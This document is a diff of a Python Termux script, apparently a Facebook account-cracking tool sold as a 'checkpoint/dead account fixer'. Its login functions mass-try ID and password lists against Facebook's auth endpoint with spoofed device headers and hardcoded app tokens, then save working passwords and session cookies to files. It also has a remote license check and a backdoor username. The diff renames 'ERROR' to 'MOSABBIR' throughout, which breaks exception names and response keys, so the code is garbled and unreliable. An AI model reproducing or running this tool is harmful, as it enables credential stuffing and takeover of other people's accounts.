@@ -22,17 +22,17 @@ from time import sleep as sp
 os.system('clear')
 try:
     import requests
-except ImportError:
+except ImportMOSABBIR:
     print('\n  installing Requests ...\n')
     os.system('pip install requests')
 try:
     import concurrent.futures
-except ImportError:
+except ImportMOSABBIR:
     print('\n  installing futures ...\n')
     os.system('pip install futures')
 try:
     import mechanize
-except ModuleNotFoundError:
+except ModuleNotFoundMOSABBIR:
     os.system('pip install mechanize > /dev/null')
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
@@ -307,7 +307,7 @@ if '{data}' in x:
     clr()
 if '(headers)' in x:
     clr()
-if 'ERROR' in x:
+if 'MOSABBIR' in x:
     clr()
 if '{headers}' in x:
     clr()
@@ -441,7 +441,7 @@ if 'str(data)' in x:
     clr()
 if 'str(headers)' in x:
     clr()
-if 'ERROR' in x:
+if 'MOSABBIR' in x:
     clr()
 if '{headers}' in x:
     clr()
@@ -467,15 +467,15 @@ def es():
       if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
            pass
       else:
-           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING ERROR-F'));exit()
+           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING MOSABBIR-F'));exit()
       if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
            pass
       else:
-           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING ERROR-F'));exit()
+           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING MOSABBIR-F'));exit()
       if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
            pass
       else:
-           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING ERROR-F'));exit()
+           system('clear');print(Panel('SYSTEM MODIFICATION NOT ALLOWED SINCE USING MOSABBIR-F'));exit()
 with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', 'r') as file:
     file_content = file.read()
 if 'print(url)' in file_content:
@@ -519,11 +519,11 @@ key2 = base64.b64encode(str(f"{kex}").encode('utf-8'))
 key=(f"{key2}")
 licu=(f"{uid}9XOJW27JBA17291")
 fkeyx = key.replace("b'","").replace("'","")
-myweb2 = requests.get("https://bryxxxpogi.blogspot.com/2025/01/error.html").text
+myweb2 = requests.get("https://bryxxxpogi.blogspot.com/2025/01/MOSABBIR.html").text
 def apv():
     try:
         clear()
-        x = requests.get("https://bryxxxpogi.blogspot.com/2025/01/error.html").text
+        x = requests.get("https://bryxxxpogi.blogspot.com/2025/01/MOSABBIR.html").text
         if str("upppdate") in update:
             os.system('clear')
             exit('SCRIPT IS IN UPDATE / MAINTANANCE BE PATIENT')
@@ -537,7 +537,7 @@ def apv():
             input(f"PRESS ENTER TO SEND KEY TOOL DEVELOPER")
             os.system(f"termux-open-url https://wa.me/+639610075203?text={kex}")  	
             apv()
-    except requests.exceptions.ConnectionError:
+    except requests.exceptions.ConnectionMOSABBIR:
         exit(' No internet connection ..')
       
 def rrrr():
@@ -753,13 +753,14 @@ def color():
 def logo():
     print(Panel(fr"""{color()}
 
-          ███████╗██████╗ ██████╗  ██████╗ ██████╗ 
-          ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
-          █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝
-          ██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗
-          ███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║
-          ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
-
+            __  __                 _     _     _      
+ |  \/  |               | |   | |   (_)     
+ | \  / | ___  ___  __ _| |__ | |__  _ _ __ 
+ | |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__|
+ | |  | | (_) \__ \ (_| | |_) | |_) | | |   
+ |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|   
+                                            
+                                            
                MY SYSTEM IS DIFFERENT BROTHER
 """,title="[bold yellow]CHECKPOINT/DEAD ACC FIXER [bold cyan]V[bold red][u]3[/u]",subtitle=f"[bold green]SIM : {ahydra}",border_style=f"{border_color()}"))
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CLEAR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
@@ -789,7 +790,7 @@ def login():
         check = response.text
         clear()
         username = input("\033[1;31mEnter Your Username: \033[1;31m")
-        if username == "errordeath":
+        if username == "MOSABBIRdeath":
              menu()
         elif username in check:
              bypass()
@@ -797,7 +798,7 @@ def login():
             print(Panel("[bold red]INVALID USERNAME. EXITING.[bold red]"))
             exit()
     except requests.exceptions.RequestException as e:
-        print(Panel(f"[bold red]ERROR FETCHING DATA: {e}"))
+        print(Panel(f"[bold red]MOSABBIR FETCHING DATA: {e}"))
         exit()
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ BYPASS ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def bypass():
@@ -805,7 +806,7 @@ def bypass():
     try:
         file_paths = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py']
         suspicious_keywords = ["print(url)", "echo", "pprint", "exec", "print(headers)", "rich", "Console", "{data}", "{url}", "{headers}", "open", ".write"]
-        remote_keywords = ["https://bryxxxpogi.blogspot.com/2025/01/error.html", "ERROR"]
+        remote_keywords = ["https://bryxxxpogi.blogspot.com/2025/01/MOSABBIR.html", "MOSABBIR"]
         for file_path in file_paths:
             with open(file_path, 'r') as file:
                 content = file.read()
@@ -820,7 +821,7 @@ def bypass():
                         exit()
         sub()        
     except Exception as e:
-        print(Panel(f"[bold red]AN ERROR OCCURRED: {e}"))
+        print(Panel(f"[bold red]AN MOSABBIR OCCURRED: {e}"))
         exit()
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def menu():
@@ -835,7 +836,7 @@ def menu():
                                 file = input(f'PUT FILE PATH : ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
-                                except FileNotFoundError:
+                                except FileNotFoundMOSABBIR:
                                         print(Panel(f'FILE LOCATION NOT FOUND'))
                                         time.sleep(1)
                                         menu()
@@ -908,15 +909,15 @@ def menu():
                                 exit(f'EXIT DONE')
                         else:
                                 exit(f'OPTION NOT FOUND IN MENU');menu()
-        except ValueError:
+        except ValueMOSABBIR:
                 exit()
-        except requests.exceptions.ConnectionError:
+        except requests.exceptions.ConnectionMOSABBIR:
                 print(f'NO INTERNET CONNECTION...')
                 exit()
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def api1(ids,names,passlist):
     global loop,oks,cps,sim_id
-    animasi = random.choice(["\x1b[1;91mERROR","\x1b[1;92mERROR","\x1b[1;93mERROR","\x1b[1;94mERROR","\x1b[1;95mERROR","\x1b[1;96mERROR","\x1b[1;97mERROR","\x1b[1;91mERROR","\x1b[1;92mERROR","\x1b[1;93mERROR","\x1b[1;94mERROR","\x1b[1;95mERROR","\x1b[1;96mERROR"])
+    animasi = random.choice(["\x1b[1;91mMOSABBIR","\x1b[1;92mMOSABBIR","\x1b[1;93mMOSABBIR","\x1b[1;94mMOSABBIR","\x1b[1;95mMOSABBIR","\x1b[1;96mMOSABBIR","\x1b[1;97mMOSABBIR","\x1b[1;91mMOSABBIR","\x1b[1;92mMOSABBIR","\x1b[1;93mMOSABBIR","\x1b[1;94mMOSABBIR","\x1b[1;95mMOSABBIR","\x1b[1;96mMOSABBIR"])
     sys.stdout.write(f"\r\033[1;32m[\033[1;35m |{animasi}\033[1;35m|\x1b[1;96m{smm} -\x1b[1;96m |{loop}|➤\x1b[1;96m |{len(oks)}|\r")
     sys.stdout.flush()
     try:
@@ -962,7 +963,7 @@ def api1(ids,names,passlist):
             li2 = random.choice(li)
             j1 = ''.join(random.choice(digits) for _ in range(2))
             jazoest = li2+j1
-            data = {'adid': adid,'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'account_recovery','generate_machine_id':'1','jazoest':'2980','meta_inf_fbmeta':'V2_UNTAGGED','encrypted_msisdn':'','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'autheticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','sig':'4c854da0db9429f4913c2a1b221c1d30'}
+            data = {'adid': adid,'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','MOSABBIR_detail_type':'button_with_disabled','source':'account_recovery','generate_machine_id':'1','jazoest':'2980','meta_inf_fbmeta':'V2_UNTAGGED','encrypted_msisdn':'','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'autheticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','sig':'4c854da0db9429f4913c2a1b221c1d30'}
             head = {'Host': 'b-graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','POST': '/auth/login HTTP/2','Host': 'b-graph.facebook.com','Priority': 'u=3, i','Content-Type': 'application/x-www-form-urlencoded','X-Fb-Sim-Hni': '64301','X-Fb-Net-Hni': '64301','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': ua,'X-Fb-Connection-Quality': 'EXCELLENT','Authorization': 'OAuth null','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '6060','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '2126'}
             url = "https://b-graph.facebook.com/auth/login"
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -970,14 +971,14 @@ def api1(ids,names,passlist):
             if "session_key" in po:
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                 cek_apk(coki)
-                print(Panel(f" [🔶ERROR🔷]\n UID ⟩ {ids} \n PAS ⟩ {pas}\n COOKIE ⟩ {coki}",title=f"[green1][ERROR-OK]",width=100,padding=(0,0),style='bold green'))
+                print(Panel(f" [🔶MOSABBIR🔷]\n UID ⟩ {ids} \n PAS ⟩ {pas}\n COOKIE ⟩ {coki}",title=f"[green1][MOSABBIR-OK]",width=100,padding=(0,0),style='bold green'))
                 cek_apk(coki)
-                open('/sdcard/ERROR-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
+                open('/sdcard/MOSABBIR-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                 oks.append(ids)
                 break
-            elif 'www.facebook.com' in po['error']['message']:
-                print(Panel(f" [🔶ERROR🔷]\n UID ⟩ {ids} \n PAS ⟩ {pas}",title=f"[red1][ERROR-CP]",width=100,padding=(0,0),style='bold red'))
-                open('/sdcard/ERROR-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
+            elif 'www.facebook.com' in po['MOSABBIR']['message']:
+                print(Panel(f" [🔶MOSABBIR🔷]\n UID ⟩ {ids} \n PAS ⟩ {pas}",title=f"[red1][MOSABBIR-CP]",width=100,padding=(0,0),style='bold red'))
+                open('/sdcard/MOSABBIR-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -1007,7 +1008,7 @@ def ph():
 def rndm(ids,passlist):
         global loop
         global oks
-        animasi = random.choice(["\x1b[1;91mERROR","\x1b[1;92mERROR","\x1b[1;93mERROR","\x1b[1;94mERROR","\x1b[1;95mERROR","\x1b[1;96mERROR","\x1b[1;97mERROR","\x1b[1;91mERROR","\x1b[1;92mERROR","\x1b[1;93mERROR","\x1b[1;94mERROR","\x1b[1;95mERROR","\x1b[1;96mERROR"])
+        animasi = random.choice(["\x1b[1;91mMOSABBIR","\x1b[1;92mMOSABBIR","\x1b[1;93mMOSABBIR","\x1b[1;94mMOSABBIR","\x1b[1;95mMOSABBIR","\x1b[1;96mMOSABBIR","\x1b[1;97mMOSABBIR","\x1b[1;91mMOSABBIR","\x1b[1;92mMOSABBIR","\x1b[1;93mMOSABBIR","\x1b[1;94mMOSABBIR","\x1b[1;95mMOSABBIR","\x1b[1;96mMOSABBIR"])
         sys.stdout.write(f"\r\033[1;32m[\033[1;35m |{animasi}\033[1;35m|\x1b[1;96m{smm} -\x1b[1;96m |{loop}|➤\x1b[1;96m |{len(oks)}|\r")
         sys.stdout.flush()       
         try:
@@ -1055,7 +1056,7 @@ def rndm(ids,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(digits) for _ in range(2))
                         jazoest = li2+j1
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','MOSABBIR_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                         headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -1069,26 +1070,26 @@ def rndm(ids,passlist):
                                         break
                                 else:
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print(Panel(f" [🔶ERROR🔷]\n UID ⟩ {str(uid)} \n PAS ⟩ {pas}\n COOKIE ⟩ {coki}",title=f"[green1][ERROR-OK]",width=100,padding=(0,0),style='bold green'))
-                                        open('/sdcard/ERROR-RNDM-COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                        open('/sdcard/ERROR-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print(Panel(f" [🔶MOSABBIR🔷]\n UID ⟩ {str(uid)} \n PAS ⟩ {pas}\n COOKIE ⟩ {coki}",title=f"[green1][MOSABBIR-OK]",width=100,padding=(0,0),style='bold green'))
+                                        open('/sdcard/MOSABBIR-RNDM-COOKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/MOSABBIR-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         check_apk(session,coki)
                                         oks.append(str(uid))
                                         break
-                        elif 'www.facebook.com' in po['error']['message']:
+                        elif 'www.facebook.com' in po['MOSABBIR']['message']:
                                 try:
-                                        uid = po['error']['error_data']['uid']
+                                        uid = po['MOSABBIR']['MOSABBIR_data']['uid']
                                 except:
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print(Panel(f" [🔶ERROR🔷]\n UID ⟩ {str(uid)} \n PAS ⟩ {pas}",title=f"[red1][ERROR-CP]",width=100,padding=(0,0),style='bold red'))
-                                        open('/sdcard/ERROR-RND-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print(Panel(f" [🔶MOSABBIR🔷]\n UID ⟩ {str(uid)} \n PAS ⟩ {pas}",title=f"[red1][MOSABBIR-CP]",width=100,padding=(0,0),style='bold red'))
+                                        open('/sdcard/MOSABBIR-RND-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(uid))
                                         break
                         else:continue
                 loop+=1
-        except requests.exceptions.ConnectionError:
+        except requests.exceptions.ConnectionMOSABBIR:
                 time.sleep(20)
         except Exception as e:
                 pass
@@ -1104,7 +1105,7 @@ def cek_apk(coki):
 	try:
 		for i in range(len(game)):
 			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
-	except AttributeError:
+	except AttributeMOSABBIR:
 		print ("\r    %s\033[0m cookie invalid"%(M))
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
@@ -1113,8 +1114,8 @@ def cek_apk(coki):
 	try:
 		for i in range(len(game)):
 			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
-	except AttributeError:
+	except AttributeMOSABBIR:
 		print ("\r    %s \033[0mcookie invalid"%(M))
 menu()
-#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CODE BY ERROR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
+#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ CODE BY MOSABBIR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
 if __name__: '__main__'
